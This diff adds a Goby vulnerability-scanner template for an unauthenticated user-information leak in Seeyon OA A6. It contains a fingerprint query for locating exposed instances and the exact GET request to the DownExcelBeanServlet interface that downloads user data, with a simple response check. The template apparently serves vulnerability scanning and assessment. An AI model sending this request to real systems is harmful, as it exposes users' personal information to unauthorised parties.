@@ -1,0 +1,53 @@
+{
+      "Name": "Seeyon OA A6 DownExcelBeanServlet User information leakage",
+      "Level": "0",
+      "Tags": [
+            "Disclosure of Sensitive Information"
+      ],
+      "GobyQuery": "app=\"Yonyou-Seeyon-OA\" && body=\"致远协创A6\"",
+      "Description": "There is an unauthorized interface in Zhiyuan OA A6, so that any visitor can download the user information in OA",
+      "Product": "Seeyon OA A6",
+      "Homepage": "https://www.seeyon.com/",
+      "Author": "PeiQi",
+      "Impact": "<p>Download user information file<br></p>",
+      "Recommandation": "",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "@",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-04-05 09:43:32",
+      "GobyVersion": "1.8.255"
+}
